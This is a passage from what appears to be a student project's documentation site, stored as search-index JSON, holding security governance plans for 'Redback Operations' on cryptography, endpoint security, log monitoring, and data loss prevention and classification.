recommendations which were made in the implementation plan for cryptography and determine which encryption software would be appropriate for each given team. Each software can be tested to see which encryption software would be most beneficial for each team.Determine whether the chosen encryption software follows all the encryption standard which are listed within the implementation plan to ensure it can be deployed into the company correctly. A list of the encryption software includes:VeraCryptBitLockerNord LockerAxCrypt More detail of each software can be found in the implementation plan for cryptography; however, even more research is needed for each team to make the appropriate decision as each software would cater differently to each of the different projects.    ","version":"Next","tagName":"h2"},{"title":"Weeks 8-11: Deployment and Training​","type":1,"pageTitle":"Deployment Plan for Cryptography - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Deployment-Plan#weeks-8-11-deployment-and-training","content":" After having analysed the different encryption software’s, this stage of the trimester would include deploying the chosen software into each teams’ systems of data they have collected. For this stage to be successful, it is important:  For all teams to ensure that the deployment has run smoothly, and that the important data that needs protection like private customer data is being encrypted correctly.For teams to ensure that all members of each team are being trained on how the new software works and that they understand the importance of the software, and it should be treated with care.For all members that once they are trained on the new software, they can use the new software and its tools so work within the team is able to continue alongside the new software. It would be useful for the teams to also implement classification levels to certain data that they have collected to ensure that not everyone is able to access any of their data. This is something that the teams will need to consider heading towards the end of the trimester, which data needs to be privatised/confidential, and which data can be left open to everyone.    ","version":"Next","tagName":"h2"},{"title":"Future Trimesters: Monitoring and Continuous Improvement​","type":1,"pageTitle":"Deployment Plan for Cryptography - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Deployment-Plan#future-trimesters-monitoring-and-continuous-improvement","content":" Going into the future trimesters, it would now be the time for the teams to analyse the success of the encryption software, are all essential data collections being protected, are all team members able to access the tools and manage the software with ease, is the software complying with the Australian encryption standards? The teams asking these questions will allow them to properly see how successful the deployment of cryptography went throughout the company. Additionally, it would be useful to:  Seek feedback from team members throughout the company to see how well the new software is being perceived and if they could recommend any changes. It would also be beneficial to conduct surveys and interviews throughout the company to seek additional feedback on the deployment, and if they would change anything about the software or the process.Look back on the audits conducted by the GRC team and to see if any improvements have been made from those initial tests prior to the implementation of the encryption software. This would allow for the company to determine which areas they have improved on and where they would still need to spend time on improvement. As more data is collected by each team, the bigger encryption software the company is going to need. This is something that the company should analyse as more data is collected, as the company is only going to continue to grow, and more data is going to be continuously collected. The company could:Conduct a full reanalysis of the encryption software which could result in more improvements being made and increasing the overall scale and security of the software.Choose to go for another encryption software which could meet their needs better of having a lot more data protection throughout their company and dealing with data on a larger scale.    This deployment plan provides a structured approach to introducing cryptographic tools into Redback Operations, ensuring secure data handling and compliance with industry standards. ","version":"Next","tagName":"h2"},{"title":"Cryptography Implementation Plan - Redback Operations","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan","content":"","keywords":"","version":"Next"},{"title":"Cryptography For Redback Operations​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#cryptography-for-redback-operations","content":" Purpose: Protection and confidentiality of data and files, ensuring the safety of communication, and maintaining authorized access only.  ","version":"Next","tagName":"h2"},{"title":"Encryption Standards:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#encryption-standards","content":" Advanced Encryption Standard (AES): Symmetric encryption algorithm, using the same key for both encryption and decryption.One of the most widely used encryption standards globally. ISO/IEC 19790:2012: This standard outlines how encryption is implemented, including authentication, testing, and configuration management. ISO/IEC 24759:2017: Covers the impartial testing process of cryptographic modules, ensuring rigorous and unbiased results.    ","version":"Next","tagName":"h3"},{"title":"Classification Levels:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#classification-levels","content":" ","version":"Next","tagName":"h2"},{"title":"1. Open/Public:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#1-openpublic","content":" Data accessible and editable by anyone.No encryption is required for this data classification.  ","version":"Next","tagName":"h3"},{"title":"2. Private/Confidential:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#2-privateconfidential","content":" Data that is sensitive and limited to authorized personnel.Requires encryption to maintain data privacy and security.Employees must distinguish between public and private data to ensure correct usage of encryption.    ","version":"Next","tagName":"h3"},{"title":"Encryption Software:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#encryption-software","content":" ","version":"Next","tagName":"h2"},{"title":"1. VeraCrypt:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#1-veracrypt","content":" Cost-free encryption software that supports multiple algorithms like AES and Serpent.Offers strong protection but may be difficult to use for beginners.  ","version":"Next","tagName":"h3"},{"title":"2. BitLocker:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#2-bitlocker","content":" Full disk encryption solution for Windows devices.Easy to use, but limited to Windows platforms.  ","version":"Next","tagName":"h3"},{"title":"3. NordLocker:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#3-nordlocker","content":" User-friendly encryption solution supporting both Windows and macOS.File-by-file encryption; subscription-based with strong security.  ","version":"Next","tagName":"h3"},{"title":"4. AxCrypt:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#4-axcrypt","content":" Subscription-based software with a free version for trial.Easy to use, offers file-by-file encryption with password protection.    ","version":"Next","tagName":"h3"},{"title":"Expected Users and Devices:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#expected-users-and-devices","content":" The plan applies company-wide, particularly focusing on developers.Devices covered include all company-issued personal devices (laptops, mobile phones) and Raspberry Pi hardware.    ","version":"Next","tagName":"h2"},{"title":"Regulatory Compliance:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#regulatory-compliance","content":" Regular audits will ensure that encryption standards are followed.Compliance with ISO standards will be key in passing external audits and company reviews.    ","version":"Next","tagName":"h2"},{"title":"References:​","type":1,"pageTitle":"Cryptography Implementation Plan - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Implementation-Plan#references","content":" Encryption Standards: ISO/IEC 19790:2012ISO/IEC 24759:2017Cyber.gov.au Guidelines on Cryptography Encryption Software: VeraCryptAxCrypt PricingNordLocker ","version":"Next","tagName":"h2"},{"title":"Endpoint Security Deployment Plan","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dp-endpoint-security","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Endpoint Security Deployment Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dp-endpoint-security#introduction","content":" This General Deployment Plan outlines the key steps for implementing endpoint security measures within the organization. The plan is designed to be carried out over two trimesters, with a structured and phased approach. The first trimester focuses on preparation, execution, and initial review, while the second trimester emphasizes continuous monitoring, feedback integration, and long-term maintenance. The tasks outlined for Trimester 2, such as monitoring, feedback collection, and adjustments, can be repeated in continuity for the following trimesters, ensuring ongoing improvements and alignment with evolving security needs. This iterative process ensures that security measures remain effective and up-to-date over time.  ","version":"Next","tagName":"h2"},{"title":"Trimester 1: Preparation and Initial Deployment​","type":1,"pageTitle":"Endpoint Security Deployment Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dp-endpoint-security#trimester-1-preparation-and-initial-deployment","content":" Task\tStart date &amp; time\tFinish date &amp; time\tOwner\tStatus\tComments/progressDefine the scope, objectives, and specific deliverables.\tWeek 1\tWeek 1\tOpen Allocate necessary resources (team, tools, budget).\tWeek 2\tWeek 2\tOpen Assign roles and responsibilities to stakeholders.\tWeek 3\tWeek 3\tOpen Develop project plan, set milestones, and create risk plan.\tWeek 4\tWeek 4\tOpen Begin implementation, focusing on high-priority areas.\tWeek 5\tWeek 5\tOpen Roll out essential security measures across endpoint devices.\tWeek 6\tWeek 7\tOpen Conduct awareness training on endpoint security practices.\tWeek 8\tWeek 8\tOpen Monitor progress and make real-time adjustments as needed.\tWeek 9\tWeek 9\tOpen Review user access and implement least privilege principle.\tWeek 10\tWeek 10\tOpen Conduct evaluation of the security implementation.\tWeek 11\tWeek 11\tOpen Gather feedback from stakeholders for improvements.\tWeek 12\tWeek 12\tOpen   ","version":"Next","tagName":"h2"},{"title":"Trimester 2 and Beyond: Continuous Improvement​","type":1,"pageTitle":"Endpoint Security Deployment Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dp-endpoint-security#trimester-2-and-beyond-continuous-improvement","content":" Task\tStart date &amp; time\tFinish date &amp; time\tOwner\tStatus\tComments/progressSet up monitoring tools to track security metrics.\tWeek 1\tWeek 1\tOpen Collect feedback through surveys and regular meetings.\tWeek 2\tWeek 2\tOpen Implement minor adjustments based on feedback.\tWeek 3\tWeek 3\tOpen Continue refining and updating security protocols as needed.\tWeek 4\tWeek 4\tOpen Finalize improvements based on feedback from stakeholders.\tWeek 5\tWeek 5\tOpen Maintain ongoing review cycles and introduce new tools.\tWeek 6-12\tWeek 12\tOpen  ","version":"Next","tagName":"h2"},{"title":"Monitoring & Log Analytics","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Implementation plan for Monitoring & Log Analytics","content":"","keywords":"","version":"Next"},{"title":"Objective Summary​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Implementation plan for Monitoring & Log Analytics#objective-summary","content":" To develop an easy way to implement a cost-effective deployment plan for our Monitoring &amp; Log Analytics policies and procedures.  ","version":"Next","tagName":"h2"},{"title":"Key Subjects​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Implementation plan for Monitoring & Log Analytics#key-subjects","content":" ","version":"Next","tagName":"h2"},{"title":"1. Research tools that can be used to collect and analyse log data:​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Implementation plan for Monitoring & Log Analytics#1-research-tools-that-can-be-used-to-collect-and-analyse-log-data","content":" Splunk:Redback currently uses Wazuh, which is a useful tool, however I believe Splunk should be added as well. Both have great log management and security monitoring, however they are driven by different approaches, with different sets of features. Wazuh is an open-source platform that provides centralised security event monitoring, threat detection, and compliance management. On the other hand, Splunk is a much broader platform that provides for advanced log analytics, machine learning-based threat detection, and powerful visualisation. Splunk also supports integrations with a wide range of third-party services and have their own tool (Machine Learning Toolkit-MLTK) which enables organisations to run machine learning models on their data for predictions and irregularity detection. This would be useful for Redback operations as they can use AI to help predict possible security threats.Mezmo: This tool also allows you to monitor and analyse log files in real-time. It is accessible in the cloud and enables you to look up, save, and keep data from any application or system, such as Windows, Linux, AWS, and Python. Mezmo could fit in with Wazuh by providing a strong log management and visualisation layer on top of Wazuh’s security monitoring and SIEM capabilities, resulting in a more comprehensive and efficient security solution  ","version":"Next","tagName":"h3"},{"title":"2. Redefine key assets and data categories​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Implementation plan for Monitoring & Log Analytics#2-redefine-key-assets-and-data-categories","content":" Key Assets  Fitness gadgets: heart rate monitors, wearable devicesPlatforms for gamified exercise: software that includes game components.Health Monitoring Systems: Tools and applications that monitor the safety of exercise.  Data Categories  User Data: Health measurements and personal data.Activity logs: Performance metrics comprise exercise data.Engagement Information: User interactions and gamification analytics.Safety Information: Health Alerts, Injury Reports.  ","version":"Next","tagName":"h3"},{"title":"3. Redefine Roles and Responsibilities​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Implementation plan for Monitoring & Log Analytics#3-redefine-roles-and-responsibilities","content":" Security experts: Safeguard user information and guarantee the safety of the infrastructure and fitness applications.Compliance: Ensures that internal log management rules and legal requirements are followed.Log Administrator: Oversees the policies for log retention, storage, and collection.  ","version":"Next","tagName":"h3"},{"title":"4. Ensure all digital assets are covered in deployment – explain how they will be covered​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Implementation plan for Monitoring & Log Analytics#4-ensure-all-digital-assets-are-covered-in-deployment--explain-how-they-will-be-covered","content":" Automated Monitoring: To quickly identify errors and problems, implement automated monitoring systems that continuously track and send alerts based on log data from all assets.Frequent Audits: Update configurations whenever new assets are added and conduct routine audits to ensure that all assets are being properly monitored and logged.  ","version":"Next","tagName":"h3"},{"title":"5. Cost Effectiveness:​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Implementation plan for Monitoring & Log Analytics#5-cost-effectiveness","content":" One user can utilize 500 MB of Splunk each day for free. Splunk also has two paid options for more sophisticated features, with pricing available upon request. Mezmo provides a 14-day free trial in addition to several paid choices and a free version, allowing the user to test the tools before fully committing.  ","version":"Next","tagName":"h3"},{"title":"6. Ease of Implementation:​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Implementation plan for Monitoring & Log Analytics#6-ease-of-implementation","content":" Splunk Training: Documentation and training materials are available to facilitate learning.User Interface: Offers a strong, configurable multi-line interface. Mezmo Quick Installation: Quick to set up and accessible via web interface.User Interface: User-friendly interface designed for real-time monitoring and log analysis.  ","version":"Next","tagName":"h3"},{"title":"7. Adherence to Regulatory Requirements:​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Implementation plan for Monitoring & Log Analytics#7-adherence-to-regulatory-requirements","content":" Mezmo Real-Time Monitoring: Assists in fulfilling regulatory requirements for logging and monitoring across multiple systems and applications by providing real-time insights and alerts. Splunk SOC2, FedRamp, and ISO 27001 Compliance: Uses strict security standards and procedures to guarantee safe data handling and protection.EEOC Compliance: Complies with regulations to ensure ethical and fair employment standards and discrimination-free hiring procedures.Sector-Specific Requirements: Respects laws like GDPR and PCI-DSS to control risks, stay compliant with the law, and maintain customer trust.  ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Implementation plan for Monitoring & Log Analytics#references","content":" Leanne Mitton, L.M. (2023). Regulatory Compliance 101: What You Need To Know. Splunk Blogs. Splunk BlogMezmo. (2024). MONITORING AND LOGGING REQUIREMENTS FOR COMPLIANCE. Regulatory Compliance. MezmoRafal Kuc, R.K. (2023). 15 Best Log Analysis Tools &amp; Log Analyzers of 2024 (Paid, Free &amp; Open Source). Sematext. Sematext Blog ","version":"Next","tagName":"h2"},{"title":"DLP & Data Classification Policies Implementation Plan","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dlp-data-classification","content":"","keywords":"","version":"Next"},{"title":"Purpose​","type":1,"pageTitle":"DLP & Data Classification Policies Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dlp-data-classification#purpose","content":" The purpose of this DLP &amp; Data Classification Implementation Plan is to outline the measures and considerations that need to be put in place in order to ensure the compliance and ease of implementation of our DLP &amp; Data Classification Policies at Redback Operations. This document should be regularly referred to and audited to ensure overall compliance.  ","version":"Next","tagName":"h2"},{"title":"Data Loss Prevention​","type":1,"pageTitle":"DLP & Data Classification Policies Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dlp-data-classification#data-loss-prevention","content":" To easily implement our Data Loss Prevention Policies/Principles, the following measures should be identified and adhered to.  ","version":"Next","tagName":"h2"},{"title":"Access Control Levels​","type":1,"pageTitle":"DLP & Data Classification Policies Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dlp-data-classification#access-control-levels","content":" Access control levels need to be broken down into a hierarchy – where those with more responsibility and motion within the company should have more access than those who are working at a lower title/rank. Access control level should be broken down, and implemented as follows:  Company Leader  The company leader should have complete, overall access to all forms of documentation, work, and projects, as they oversee all operations within Redback Operations  Team Leader  The team leaders (for each project) should have complete access to all work, projects and documentation that directly relates to their team. For example, the Cybersecurity team leader should have complete access to all forms of work, documentation and projects directly associated with the cybersecurity team, and should only be able to access publicly available information for the other projects/teams.  Sub-Team Leader  Sub-Team leaders, such as those for the GRC team, Red Team, Blue Team, etc., should only have direct access to the work directly associated with their sub-team, as they oversee all the work done by their respective sub-team and should only be able to access publicly available information for the other Sub-Teams.  Team Member  Team members should only have access to the work, documentation and projects that they are directly involved in, though work may be shared within sub-teams if appropriate and non-restricted. Aside from their own work and work shared with them, team members should only be able to access publicly available information associated with the company, and its current/past projects.  In defining these Access Control levels, we can further prevent unauthorized copies of data by only allowing those with sufficient access levels to be able to access and modify our documentation.  ","version":"Next","tagName":"h3"},{"title":"Watermark​","type":1,"pageTitle":"DLP & Data Classification Policies Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dlp-data-classification#watermark","content":" The Redback Operations watermark must be included in all forms of work, documentation and projects to ensure the integrity of our data – this watermark is available to all levels of employees. The watermark consists of a single form, which can be implemented in Microsoft suite applications, such as Word or PowerPoint. The watermark should be a string of text spanning from diagonal corners labelled “Property of Redback Operations”.  How to insert our watermark: In a word document, in the DESIGN tab &gt; select WATERMARK &gt; select CUSTOM WATERMARK &gt; select TEXT WATERMARK &gt; type “Property of Redback Operations”.  The following screenshot shows the settings for the watermark:    ","version":"Next","tagName":"h3"},{"title":"Encryption Applications​","type":1,"pageTitle":"DLP & Data Classification Policies Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dlp-data-classification#encryption-applications","content":" In reference to our Cryptography policy, SHA-256 or higher is required for our hashing operations, and TLS 1.2 or higher must be used for data transmission, and the AES (Advanced Encryption Standard) with key sizes of 256 must be adhered to. As mentioned in the cryptography implementation plan, services such as ‘VeraCrypt’, ‘BitLocker’, ‘Nord Locker’ or ‘AxCrypt’ can be implemented to ensure our data encryption and security aligns with our Cryptography policy.  ","version":"Next","tagName":"h3"},{"title":"Content Inspection​","type":1,"pageTitle":"DLP & Data Classification Policies Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dlp-data-classification#content-inspection","content":" Content inspections for work that team members produced must be done by the respective team/sub-team leaders. Content inspections should be regularly conducted on files, documents and projects to ensure that no restricted information is set to be released to unauthorized persons.  Automated email monitoring services should be implemented to alert or block emails that violate company policies, or the confidentiality and integrity of our data. An example tool that can be implemented is ‘Teramind’s “Employee Email Monitoring” solution. This automatically scans through mail that is sent and received, alerting our DLP security team in the event of unauthorized information being sent through email. Once this alert is received, our DLP team can take action to remove the email, and the individual who sent the message can be dealt with accordingly.  ","version":"Next","tagName":"h3"},{"title":"Adherance to Regulatory Requirements​","type":1,"pageTitle":"DLP & Data Classification Policies Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dlp-data-classification#adherance-to-regulatory-requirements","content":" Regular audits must take place bi-monthly to ensure the complete compliance with each Data Loss Prevention and Data Classification policy and its respective implementation plan. These audits must have employees re-familiarise themselves with our policies and procedures and ensure compliance.  ","version":"Next","tagName":"h3"},{"title":"Data Classification​","type":1,"pageTitle":"DLP & Data Classification Policies Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dlp-data-classification#data-classification","content":" To easily implement our data classification policy and practices, data must be classified based on sensitivity, importance and business impact. This can be done as follows:  • Public: Data intended for public disclosure. Encryption is not required for public data, but best practices for integrity should still be applied.  • Internal Use Only: Data that is not sensitive but is intended for use within the organization. Basic encryption controls are recommended to prevent unauthorized disclosure.  • Confidential: Sensitive data that could cause harm to the organization or individuals if disclosed. Encryption in transit and at rest, using industry-standard algorithms and key strengths, is required.  • Restricted: Highly sensitive data that, if disclosed, could result in significant harm or legal/regulatory non-compliance. Strong encryption, both in transit and at rest, with strict access controls and key management procedures, is mandatory.  Directly sourced from ‘Cryptography Policy’ &amp; ‘Data Classification – DLP Policy’  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"DLP & Data Classification Policies Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/dlp-data-classification#conclusion","content":" To conclude, the implementation of our Data Loss Prevention and Data Classification Policies can be done by complying with the above information.  This plan should be regularly reviewed and audited to ensure compliance in all areas (this audit can be done every quarter).  The overall compliance and implementation of this plan is pivotal for the security and protection of data within Redback Operations. ","version":"Next","tagName":"h2"},{"title":"Endpoint Security Implementation Plan","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#introduction","content":" ","version":"Next","tagName":"h2"},{"title":"Purpose​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#purpose","content":" The purpose of this implementation plan is to establish a clear framework for securing all endpoint devices within Redback Operations. This plan is designed to protect sensitive data, prevent unauthorized access, and ensure compliance with international security standards like ISO/IEC 27001. By detailing specific security measures, the plan provides robust protection for all devices, whether used in-office or remotely.  ","version":"Next","tagName":"h3"},{"title":"Scope​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#scope","content":" This plan covers all endpoint devices, including laptops, desktops, mobile phones, servers, and research devices. It applies to both Redback-owned and contributor-owned devices, such as those used by partners or contractors.  ","version":"Next","tagName":"h3"},{"title":"Definitions and References​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#definitions-and-references","content":" Information Security Management System (ISMS): The framework for managing and protecting information assets within Redback Operations.ISO/IEC 27001: International standard for establishing and maintaining an information security management system.NIST Cybersecurity Framework: Guidelines for enhancing cybersecurity by identifying, protecting, detecting, responding to, and recovering from cyber threats.Affiliated Contributors: Individuals or groups like Deakin University SIT capstone students working with Redback Operations.Endpoint Device: Any device connecting to Redback Operations' network, such as laptops, desktops, mobile devices, and servers.  ","version":"Next","tagName":"h2"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#roles-and-responsibilities","content":" Role\tResponsibilitiesLeadership\t- Approve security policies and ensure they align with organizational goals. - Allocate resources, including budget and personnel, to support the implementation and maintenance of endpoint security measures. - Monitor compliance with security standards and ensure all teams adhere to established policies. - Provide strategic guidance on risk management and respond to significant security incidents. IT and Security Teams\t- Conduct thorough risk assessments to identify potential vulnerabilities in endpoint devices. - Develop and implement security measures, including encryption, access controls, and monitoring systems. - Perform regular testing and updates to security systems to ensure they remain effective against emerging threats. - Provide technical support to end users, assisting with the implementation of security practices and responding to security-related issues. - Monitor compliance with security protocols and address any deviations or incidents promptly. End Users\t- Adhere to all security policies and procedures outlined in the implementation plan. - Regularly update software and applications to ensure they are protected against known vulnerabilities. - Practice good digital hygiene, such as using strong passwords, enabling multi-factor authentication, and avoiding phishing attempts. - Report any security incidents or suspicious activities to the IT and Security Teams immediately.  ","version":"Next","tagName":"h2"},{"title":"Storage Methods​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#storage-methods","content":" ","version":"Next","tagName":"h2"},{"title":"Physical Storage Solutions​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#physical-storage-solutions","content":" To enhance physical security for endpoint devices, lockable storage containers will be implemented to secure devices when not in use. These containers will be placed in restricted areas accessible only to authorized personnel, reducing the risk of unauthorized access.  For example, biometric access control systems will be used to grant entry to the storage area, ensuring that only designated staff can retrieve or store devices.  ","version":"Next","tagName":"h3"},{"title":"Digital Storage Solutions​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#digital-storage-solutions","content":" Amazon Web Services (AWS) will be selected as the primary cloud storage provider due to its compliance with ISO 27001 standards and robust encryption capabilities. Data stored in AWS will be encrypted both at rest and in transit, with multi-factor authentication (MFA) enforced for access. Backup data will be securely stored in AWS S3 Glacier, ensuring long-term retention and cost-effective storage.  Additionally, Microsoft Azure will serve as a secondary provider to ensure data redundancy and high availability. Azure provides automated backup solutions, complemented by advanced threat protection measures. Backups will adhere to the 3-2-1 strategy: maintaining three copies of data, two of which are local on different devices, and one off-site in Azure's secure cloud environment.  Backup Schedule:​  Daily backups will be conducted at the close of business each day, with encrypted data transferred to AWS S3 Glacier.Weekly secondary backups will be rotated to Azure’s cloud storage, ensuring that the most recent data is always available in a geographically separated location.In case of an emergency, data recovery processes will enable restoration from either AWS or Azure within 24 hours.  Data Access:​  User access to cloud-stored data will be managed through role-based access controls via AWS Identity and Access Management and Azure Active Directory.Regular reviews of access logs will be conducted, and MFA will be required to enhance security.  ","version":"Next","tagName":"h3"},{"title":"Awareness Training​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#awareness-training","content":" ","version":"Next","tagName":"h2"},{"title":"Content​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#content","content":" To foster a culture of security awareness, comprehensive training materials will be developed covering key aspects of digital hygiene. These materials will include:  Regular Software Updates: Training on the importance of keeping software up-to-date, with guidance on configuring automatic updates and understanding patch management processes.Secure Browsing Practices: Instructions on how to identify secure websites, avoid malicious downloads, and safely use web browsers. This includes using security features such as HTTPS and browser extensions designed to enhance security.Phishing Awareness: Detailed modules on recognizing and avoiding phishing attempts, including real-world examples and interactive simulations demonstrating common phishing tactics such as email spoofing, malicious links, and social engineering techniques.Password Management: Guidance on creating strong, unique passwords, the dangers of password reuse, and the benefits of using password managers. This includes practical demonstrations on setting up and using password management tools, as well as best practices for multi-factor authentication (MFA) to further secure user accounts.Incident Reporting: Procedures for reporting security incidents, including recognizing suspicious activity and the appropriate steps to take if users suspect their credentials or devices have been compromised.  ","version":"Next","tagName":"h3"},{"title":"Method​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#method","content":" Interactive and engaging online training modules will be developed to ensure that users not only understand but can apply important security practices. These modules will feature:  Scenario-Based Learning: Real-world scenarios and case studies will be used to demonstrate the potential consequences of poor security practices, allowing users to apply what they’ve learned in simulated environments.Quizzes and Assessments: Regular quizzes will be included to assess users' understanding of the material, with feedback provided to help users improve. These assessments will reinforce key concepts and ensure long-term retention of information.Periodic Refresher Courses: To maintain a high level of security awareness, refresher courses will be scheduled quarterly. These courses will cover updates to security policies, emerging threats, and any new tools or practices introduced to the organization’s security framework.Completion Tracking and Certification: A system will be implemented to track the completion of training modules, ensuring that all users complete their required training. Upon completion, users will receive certification acknowledging their understanding of the organization’s security policies and practices.  ","version":"Next","tagName":"h3"},{"title":"Least Privilege​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#least-privilege","content":" ","version":"Next","tagName":"h2"},{"title":"User 